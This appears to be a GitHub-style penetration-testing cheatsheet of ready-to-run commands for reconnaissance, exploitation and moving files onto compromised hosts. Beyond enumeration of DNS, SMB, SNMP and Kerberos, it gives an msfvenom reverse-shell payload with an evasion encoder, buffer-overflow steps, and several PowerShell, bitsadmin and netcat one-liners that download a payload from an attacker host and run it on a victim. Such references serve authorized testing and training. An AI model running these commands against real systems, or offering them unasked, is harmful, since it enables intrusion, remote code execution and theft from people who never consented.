# Offensive Security / PenTesting Cheatsheets
A collection of cheatsheets, convenience functions  and other useful snippets to aid during pentest engagement.
Disclaimer: I do not claim ownership of netcat and linux privilege escalation or reverse shell scripts.

## Reconnaissance / Enumeration

#### Extracting Live IPs from Nmap Scan
```bash
nmap 10.1.1.1 --open -oG scan-results; cat scan-results | grep "/open" | cut -d " " -f 2 > exposed-services-ips
```

#### DNS lookups, Zone Transfers & Brute-Force
```bash
whois domain.com
dig {a|txt|ns|mx} domain.com
dig {a|txt|ns|mx} domain.com @ns1.domain.com
host -t {a|txt|ns|mx} megacorpone.com
host -a megacorpone.com
host -l megacorpone.com ns1.megacorpone.com
dnsrecon -d megacorpone.com -t axfr @ns2.megacorpone.com
dnsenum domain.com
nslookup -> set type=any -> ls -d domain.com
for sub in $(cat subdomains.txt);do host $sub.domain.com|grep "has.address";done
```

#### Banner Grabbing
```bash
nc -v $TARGET 80
telnet $TARGET 80
curl -vX $TARGET
```

#### Kerberos User Enumeration
```bash
nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test'
```


#### HTTP Brute-Force & Vulnerability Scanning
```bash
target=10.0.0.1; gobuster -u http://$target -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 150 -l | tee $target-gobuster
target=10.0.0.1; nikto -h http://$target:80 | tee $target-nikto
target=10.0.0.1; wpscan --url http://$target:80 --enumerate u,t,p | tee $target-wpscan-enum
```

#### RPC / NetBios / SMB
```bash
rpcinfo -p $TARGET
nbtscan $TARGET

#list shares
smbclient -L //$TARGET -U ""

# null session
rpcclient -v "" $TARGET
smbclient -L //$TARGET
enum4linux $TARGET
```

#### SNMP
```bash

# Windows User Accounts
snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.25

# Windows Running Programs
snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.4.2.1.2

# Windows Hostname
snmpwalk -c public -v1 $TARGET .1.3.6.1.2.1.1.5

# Windows Share Information
snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.3.1.1

# Windows Share Information
snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.27

# Windows TCP Ports
snmpwalk -c public -v1 $TARGET4 1.3.6.1.2.1.6.13.1.3

# Software Name
snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.6.3.1.2

# brute-force community strings
onesixtyone -i snmp-ips.txt -c community.txt

snmp-check $TARGET
```

#### SMTP
```bash
smtp-user-enum -U /usr/share/wordlists/names.txt -t $TARGET -m 150
```

## Gaining Access

#### Generating Payload Pattern & Calculating Offset
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q $EIP_VALUE
```

#### Generating Payload with msfvenom
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.245 LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
```

#### Compiling Code From Linux
```bash
# Windows
i686-w64-mingw32-gcc source.c -lws2_32 -o out.exe

# Linux
gcc -m32|-m64 -o output source.c
```



## Local Enumeration & Privilege Escalation

#### Binary Exploitation with ImmunityDebugger

##### Get Loaded Modules
```
# We're interested in modules without protection, Read & Execute permissions
!mona modules
```

##### Finding JMP ESP Address
```
!mona find -s "\xFF\xE4" -m moduleName
```


#### Setting up Simple HTTP server
```bash
# Linux
python -m SimpleHTTPServer 80
python3 -m http.server
ruby -r webrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"
php -S 0.0.0.0:80
```


#### Uploading Files to Target Machine

##### TFTP
```bash
#tftp; Linux: cat /etc/default/atftpd to find out file serving location; default in kali /srv/tftp
service atftpd start

# Windows
tftp -i $ATTACKER get /download/location/file /save/location/file
```

##### FTP
```bash
# Linux: set up ftp server with anonymous logon access;
twistd -n ftp -p 21 -r /file/to/serve

# Windows shell: read FTP commands from ftp-commands.txt non-interactively;
echo open $ATTACKER>ftp-commands.txt
echo anonymous>>ftp-commands.txt
echo whatever>>ftp-commands.txt
echo binary>>ftp-commands.txt
echo get file.exe>>ftp-commands.txt
echo bye>>ftp-commands.txt 
ftp -s:ftp-commands.txt
```

##### HTTP: Powershell
```PowerShell
powershell -Command "& {(New-Object Net.WebClient).DownloadFile('http://$ATTACKER/file.exe', 'C:\file.exe')}"
powershell -Command "& {Invoke-WebRequest 'http://$ATTACKER/file.exe' -OutFile 'C:\file.exe'; Start-Process 'file.exe'}"
powershell (New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/file.exe','file.exe');(New-Object -com Shell.Application).ShellExecute('file.exe');
```

##### HTTP: VBScript
Copy and paste contents of [wget-cscript](https://github.com/mantvydasb/Offensive-Security-Cheatsheets/blob/master/wget-cscript) into a Windows Shell and then:
```
cscript wget-cscript http://$ATTACKER/file.exe localfile.exe
```

##### HTTP: Linux
```bash
wget http://$ATTACKER/file
curl http://$ATTACKER/file
scp ~/file/file.bin user@$TARGET:tmp/backdoor.py
```

##### NetCat
```Bash
# Attacker
nc -l -p 4444 < /tool/file.exe

# Victim
nc $ATTACKER 4444 > file.exe
```

##### HTTP: Windows "debug.exe" Method

```bash
# 1. In Linux, convert binary to hex ascii:
wine /usr/share/windows-binaries/exe2bat.exe /root/tools/netcat/nc.exe nc.txt
# 2. Paste nc.txt into Windows Shell.
```

##### HTTP: Windows BitsAdmin
```bash
cmd.exe /c "bitsadmin /transfer myjob /download /priority high http://$ATTACKER/payload.exe %tmp%\payload.exe&start %tmp%\payload.exe
```

#### Bash Ping Sweeper
```bash
#!/bin/bash
for lastOctet in {1..254}; do 
    ping -c 1 10.0.0.$lastOctet | grep "bytes from" | cut -d " " -f 4 | cut -d ":" -f 1 &
done
```

#### Brute-forcing XOR'ed string with 1 byte key in Python
```python
encrypted = "encrypted-string-here"
for i in range(0,255):
    print("".join([chr(ord(e) ^ i) for e in encrypted]))
```

#### Generating Bad Character Strings
```python
# Python
'\\'.join([ "x{:02x}".format(i) for i in range(1,256) ])
```

```bash
# Bash
for i in {1..255}; do printf "\\\x%02x" $i; done
```

#### Converting Python to Windows Executable (.py -> .exe)
```bash
python pyinstaller.py --onefile convert-to-exe.py
```

#### Port Scanning with NetCat
```bash
nc -nvv -w 1 -z host 1000-2000
nc -nv -u -z -w 1 host 160-162
```

#### Finding Vulnerable Windows Services
```
# Look for SERVICE_ALL_ACCESS in the output
accesschk.exe -uwcqv "user-you-have-shell-with" *
```


#### General File Search
```bash
# query the local db for a quick file find. Run updatedb before executing locate.
locate passwd 

# show which file would be executed in the current environment, depending on $PATH environment variable;
which nc wget curl php perl python netcat tftp telnet ftp

# search for *.conf (case-insensitive) files recursively starting with /etc;
find /etc -iname *.conf
```

This is inspired and based on [Dostoevsky's Pentest Notes](https://github.com/dostoevskylabs/dostoevsky-pentest-notes).
